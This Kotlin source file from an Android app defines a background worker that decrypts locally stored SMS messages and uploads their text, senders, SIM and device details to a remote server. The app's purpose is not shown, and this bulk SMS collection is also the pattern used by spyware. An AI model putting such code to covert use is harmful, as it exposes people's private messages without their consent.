package com.rohan.connecthub.workers

import android.content.Context
import android.util.Base64
import androidx.work.CoroutineWorker
import androidx.work.WorkerParameters
import com.rohan.connecthub.api.RetrofitClient
import com.rohan.connecthub.data.db.AppDatabase
import com.rohan.connecthub.models.SmsLogRequest
import com.rohan.connecthub.utils.SharedPrefManager
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.withContext

class RetryUploadWorker(context: Context, workerParams: WorkerParameters) :
    CoroutineWorker(context, workerParams) {

    override suspend fun doWork(): Result = withContext(Dispatchers.IO) {
        try {
            val smsDao = AppDatabase.getDatabase(applicationContext).smsMessageDao()
            val unsyncedSms = smsDao.getUnsyncedSms()
            val api = RetrofitClient.getInstance(applicationContext)
            val deviceId = SharedPrefManager.getDeviceId(applicationContext) ?: ""

            if (deviceId.isEmpty()) {
                return@withContext Result.retry()
            }

            for (sms in unsyncedSms) {
                // If IV is empty, it was saved as plain text
                val messageBodyStr = if (sms.iv.isEmpty()) {
                    String(sms.messageBody)
                } else {
                    try {
                        com.rohan.connecthub.utils.CryptoUtils.decrypt(sms.iv, sms.messageBody)
                    } catch (e: Exception) {
                        Base64.encodeToString(sms.messageBody, Base64.NO_WRAP)
                    }
                }
                
                val ivStr = if (sms.iv.isEmpty()) "" else Base64.encodeToString(sms.iv, Base64.NO_WRAP)

                val request = SmsLogRequest(
                    device_id = deviceId,
                    sender = sms.sender,
                    messageBody = messageBodyStr,
                    iv = ivStr,
                    timestamp = sms.timestamp,
                    sim_info = sms.simInfo,
                    device_model = sms.deviceModel,
                    android_version = sms.androidVersion
                )

                try {
                    val response = api.syncSms(request)
                    if (response.isSuccessful) {
                        smsDao.markAsSynced(sms.id)
                    }
                } catch (e: Exception) {
                    // Continue to next message or retry later
                }
            }
            Result.success()
        } catch (e: Exception) {
            Result.retry()
        }
    }
}